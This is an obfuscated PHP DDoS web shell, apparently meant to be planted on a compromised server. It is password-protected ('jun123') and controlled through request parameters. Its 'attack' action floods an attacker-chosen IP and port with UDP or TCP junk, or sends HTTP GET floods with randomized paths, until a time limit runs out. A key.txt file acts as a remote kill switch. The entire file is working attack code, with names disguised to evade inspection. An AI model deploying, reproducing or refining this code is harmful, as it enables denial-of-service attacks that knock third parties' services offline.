<?php $oooo0o00o0o0o0o0o0o0o00000o0o0o0o0o0oo0o0o0o0o0oo0="jun123";
    $ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0 = gethostbyname($_SERVER["SERVER_NAME"]);
    $ooooooooo0oo0oo0o0o0o0oO0OO0O0OOO0o0="win2003";

    //POWER-BY 
    //�����޸� BY:Code 
    //DDOS-Ѫ��ľ��
    $o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o="key.txt";
    if(!oOo00o0OOo0o0000o0o0O($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o)){OOOOOOO0OOO0O0O0O00O0O0($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o,"<?php\n return \"die\";
    \n?>",true);}$Oooo0ooO0oo0ooooooo0 = include $o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o;
    if(!isset($_REQUEST["act"])){OOOOOOOOOOoOo00o0OOo0o0000o0o0O('<title>by:Code</title><body style="background-color:#EA0000;margin:0px;text-align:center"></a>
    </body>');
    }if($_REQUEST["act"]=="die"){if(!oo00o0OOo0o00O("fsockopen")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL������ȱ�ٱ�Ҫ����֧��.");}if(!oo00o0OOo0o00O("set_time_limit") or !oo00o0OOo0o00O("ignore_user_abort")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL�������޷������Զ�����.");}if(@oOo00o0OOo0o000000O($_REQUEST["pass"])<>oOo00o0OOo0o000000O($oooo0o00o0o0o0o0o0o0o00000o0o0o0o0o0oo0o0o0o0o0oo0)){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL�������,�޷�����.");}OOOOOOO0OOO0O0O0O00O0O0($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o,"<?php\n return \"die\";\n?>",true);
    OOOOOOOOOOoOo00o0OOo0o0000o0o0O("died");}if($_REQUEST["act"]=="view"){if(!oo00o0OOo0o00O("fsockopen")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL������ȱ�ٱ�Ҫ����֧��.");
    }if(!oo00o0OOo0o00O("set_time_limit") or !oo00o0OOo0o00O("ignore_user_abort")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL�������޷������Զ�����.");
    }if(@oOo00o0OOo0o000000O($_REQUEST["pass"])<>oOo00o0OOo0o000000O($oooo0o00o0o0o0o0o0o0o00000o0o0o0o0o0oo0o0o0o0o0oo0)){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL�������,�޷�����.");}OOOOOOOOOOoOo00o0OOo0o0000o0o0O("ok:".$ooooooooo0oo0oo0o0o0o0oO0OO0O0OOO0o0."|".$ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0."|".$Oooo0ooO0oo0ooooooo0);
    }if($_REQUEST["act"]=="attack"){ignore_user_abort (true);set_time_limit(0);$O0O0o0Oo0Oo0oO0oOoO0OOo00O00O0o0O0O0o0O0o0O0o000O0O0o = 0;
    if(!isset($_REQUEST["ip"]) or !isset($_REQUEST["port"]) or !isset($_REQUEST["exec_time"]) or !isset($_REQUEST["att_size"])){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error:�����ύ����");
    }if(@oOo00o0OOo0o000000O($_REQUEST["pass"])<>oOo00o0OOo0o000000O($oooo0o00o0o0o0o0o0o0o00000o0o0o0o0o0oo0o0o0o0o0oo0)){OOOOOOOOOOoOo00o0OOo0o0000o0o0O("error��SHELL�������,�޷�����.");}OOOOOOO0OOO0O0O0O00O0O0($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o,"<?php\n return \"true\";\n?>",true);
    $ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0 = gethostbyname($_REQUEST["ip"]);$rand = oOo00o0OOo0o000000O($_REQUEST["port"]);
    $exec_time = oOo00o0OOo0o000000O($_REQUEST["exec_time"]);
    $att_size= oOo00o0OOo0o000000O($_REQUEST["att_size"]);@$att_type= oOo00o0OOo0o000000O($_REQUEST["att_type"]);
    @$att_web= oOo00o0OOo0o000000O($_REQUEST["att_web"]);@$att_blqs= oOo00o0OOo0o000000O($_REQUEST["att_blqs"]);
    @$att_bljs= oOo00o0OOo0o000000O($_REQUEST["att_bljs"]);$time =  time();$max_time = $time+$exec_time;
    $out="";
    for($i=0;$i<floor($att_size/100);$i++){$dosstr=OOOOO0o0o0o0o(100);@$out.= "XXDD0S".$dosstr;}while(1){$Oooo0ooO0oo0ooooooo0 = include $o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o;
    if ($Oooo0ooO0oo0ooooooo0=="true"){$O0O0o0Oo0Oo0oO0oOoO0OOo00O00O0o0O0O0o0O0o0O0o000O0O0o++;if(time() > $max_time){OOOOOOO0OOO0O0O0O00O0O0($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o,"<?php\n return \"die\";\n?>",true);break;}if($att_type!=="tcp"){
            if($att_type!=="cc"){$fp = fsockopen("udp://$ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0", $rand, $errno, $errstr, 5);
    if($fp){fwrite($fp, $out);}}else{        $fp = fsockopen(oOoOOoOOoo00O0OOO0O($att_web), o0ooo0($att_web), $errno, $errstr, 5);
    $Aanvraag = "GET ".o0o0o0o0o0o0o0O0O0o0O0O0o0($att_web,$att_blqs,$att_bljs)." HTTP/1.1\r\n";
    $Aanvraag .= "Referer: http://".oOoOOoOOoo00O0OOO0O($att_web)."/?".$out." \r\n";
    $Aanvraag .= "Accept: */*\r\n";
    $Aanvraag .= "Accept-Language: zh-CN, zh, *\r\n";
    $Aanvraag .= "Accept-Encoding: gzip, deflate\r\n";
    $Aanvraag .= "User-Agent: Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.1)\r\n";
    $Aanvraag .= "Host: ".oOoOOoOOoo00O0OOO0O($att_web).":".o0ooo0($att_web)."\r\n";
    $Aanvraag .= "Connection: Keep-Alive\r\n\r\n";
    fwrite($fp, $Aanvraag);
    }}else{
            $fp = fsockopen("$ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0", $rand, $errno, $errstr, 5);
    if($fp){fputs($fp, $out);
    }}fclose($fp);
    }elseif($Oooo0ooO0oo0ooooooo0=="die"){       die("I am dying!");
    }}@OOOOOOOOOOoOo00o0OOo0o0000o0o0O("over");
    }function OOOOOOO0OOO0O0O0O00O0O0($o0Oo0o0O00o00Oo,$O0oooooOO0oo0oo0o0o,$O0o0o0O0Oo0=false){   $o0Oo0o0O00o00Oo=dirname(__FILE__)."/".$o0Oo0o0O00o00Oo;
    if ($O0o0o0O0Oo0==false){file_put_contents($o0Oo0o0O00o00Oo,$O0oooooOO0oo0oo0o0o,FILE_APPEND);
    }else{
    file_put_contents($o0Oo0o0O00o00Oo,$O0oooooOO0oo0oo0o0o);
    }}function oo00o0OOo0o00O($a){return function_exists($a);
    }function oOo00o0OOo0o000000O($a){return trim($a);
    }function oOo00o0OOo0o0000o0o0O($a){return file_exists($a);
    }function OOOOOOOOOOoOo00o0OOo0o0000o0o0O($a){return exit("".$a);
    }function OOOOO0o0o0o0o($i){$o0o0o0O0O0O00O00o00o0oO0O0o = "abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:ZXCVBNM<>?/";
    $oo0o0O0o00oOo0O0o0OoOOoO0OoOoO = "";
    for($o0o0o0ooooooo=0;
    $o0o0o0ooooooo<$i;
    $o0o0o0ooooooo++){
    $oo0o0O0o00oOo0O0o0OoOOoO0OoOoO.= substr($o0o0o0O0O0O00O00o00o0oO0O0o,rand(0,(strlen($o0o0o0O0O0O00O00o00o0oO0O0o)-1)),1);
    }return $oo0o0O0o00oOo0O0o0OoOOoO0OoOoO;
    }function oOoOOoOOoo00O0OOO0O($oOoOOoOOoo00O0OOO0OO){
    $oOOoOOoo00O0OOO0O=substr($oOoOOoOOoo00O0OOO0OO,7,555);
    $oOOoOOoo00O0OOO0O=substr($oOOoOOoo00O0OOO0O,0,strpos($oOOoOOoo00O0OOO0O,"/"));
    if(@strpos($oOOoOOoo00O0OOO0O,":")){$oOOoOOoo00O0OOO0O=substr($oOOoOOoo00O0OOO0O,0,strpos($oOOoOOoo00O0OOO0O,":"));
    }return $oOOoOOoo00O0OOO0O;
    }function o0ooo0($o00000000ooOOO00oo0o00O0o0){
    $o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,7,555);
    if(@strpos($o00000000ooOOO00oo0o00O0o0,":")){$o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,strpos($o00000000ooOOO00oo0o00O0o0,":")+1,8);
    }else{$o00000000ooOOO00oo0o00O0o0="80";
    }if(@strpos($o00000000ooOOO00oo0o00O0o0,"/")){$o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,0,strpos($o00000000ooOOO00oo0o00O0o0,"/"));
    }return $o00000000ooOOO00oo0o00O0o0;
    }function o0o0o0o0o0o0o0O0O0o0O0O0o0($o00000000ooOOO00oo0o00O0o0,$O0O1,$O0O2){
    $o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,7,555);
    if(@!strpos($o00000000ooOOO00oo0o00O0o0,"/")){$o00000000ooOOO00oo0o00O0o0="/";
    }else{$o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,strpos($o00000000ooOOO00oo0o00O0o0,"/"),555);
    }$o00000000ooOOO00oo0o00O0o0=str_replace("{szbl}",rand($O0O1,$O0O2),$o00000000ooOOO00oo0o00O0o0);
    $o00000000ooOOO00oo0o00O0o0=str_replace("{*|*}","?",$o00000000ooOOO00oo0o00O0o0);
    $o00000000ooOOO00oo0o00O0o0=str_replace("{|*|}","&",$o00000000ooOOO00oo0o00O0o0);
    return $o00000000ooOOO00oo0o00O0o0;
    }
    ?>
